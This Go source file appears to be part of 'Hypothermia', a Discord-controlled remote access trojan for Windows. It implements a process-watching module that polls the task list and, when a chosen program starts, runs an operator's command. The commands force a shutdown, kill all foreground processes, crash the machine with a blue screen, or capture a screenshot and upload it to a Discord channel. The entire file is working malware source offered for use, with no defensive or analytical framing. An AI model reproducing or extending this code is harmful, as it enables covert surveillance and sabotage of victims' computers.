package utils

import (
	"Hypothermia/src/funcs"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"maps"
)

const ()

var (
	ProcSpyListeners = make(map[string]string)

	ProcSpyMutex  sync.Mutex
	ProcSpyActive bool
	ProcSpyStop   chan struct{}
)

func StartProcSpy(s *discordgo.Session, m *discordgo.MessageCreate, channel <-chan struct{}) {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-channel:
			return

		case <-ticker.C:
			ProcSpyMutex.Lock()

			listeners := make(map[string]string)
			maps.Copy(listeners, ProcSpyListeners)

			ProcSpyMutex.Unlock()

			if len(listeners) == 0 {
				ProcSpyMutex.Lock()
				ProcSpyActive = false
				ProcSpyMutex.Unlock()
				return
			}

			cmd := exec.Command("tasklist")
			output, err := cmd.Output()
			if err != nil {
				continue
			}

			proc := strings.ToLower(string(output))

			for procName, action := range listeners {
				if strings.Contains(proc, procName) {
					switch strings.ToLower(action) {
					case "shutdown":
						exec.Command("shutdown", "/s", "/t", "0").Run()
					case "kill_fg":
						exec.Command("powershell", "-Command", "Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | ForEach-Object { Stop-Process -Id $_.Id -Force }").Run()
					case "bsod":
						funcs.BlueScreen()
					case "ss":
						pic, _ := funcs.Screenshot()
						if pic != nil {
							s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
								Reference: m.Reference(),
								Files: []*discordgo.File{{
									Name:   "ss.jpg",
									Reader: pic,
								}},
							})
						}
					}

					ProcSpyMutex.Lock()
					delete(ProcSpyListeners, procName)
					ProcSpyMutex.Unlock()
				}
			}
		}
	}
}

func StopProcSpy() {
	ProcSpyMutex.Lock()
	defer ProcSpyMutex.Unlock()

	ProcSpyListeners = make(map[string]string)
	if ProcSpyActive {
		close(ProcSpyStop)
		ProcSpyActive = false
	}
}
